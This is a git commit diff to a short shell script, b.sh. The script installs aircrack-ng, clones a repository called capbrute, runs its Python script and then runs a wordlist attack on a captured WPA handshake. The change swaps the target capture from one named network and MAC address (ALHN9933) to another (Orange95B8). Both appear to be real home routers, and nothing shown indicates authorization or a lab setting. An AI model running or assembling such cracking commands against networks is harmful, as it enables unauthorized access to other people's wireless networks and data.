8b2cdcb5b08e0422a48e4713197940e04e67403b
JamalNiga <141185853+JamalNiga@users.noreply.github.com>
2023-09-26 12:35:42 +0100

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,5 +3,5 @@ sudo apt install python3 aircrack-ng wget -y
 git clone https://github.com/JamalNiga/capbrute
 cd capbrute
 python3 hy.py
-sudo aircrack-ng -w pass.txt handshake_ALHN9933_EC-84-B4-CF-80-7D_2023-09-25T09-37-19.cap
+sudo aircrack-ng -w pass.txt handshake_Orange95B8_DC-73-85-B0-95-B8_2023-09-25T09-31-00.cap
 #-
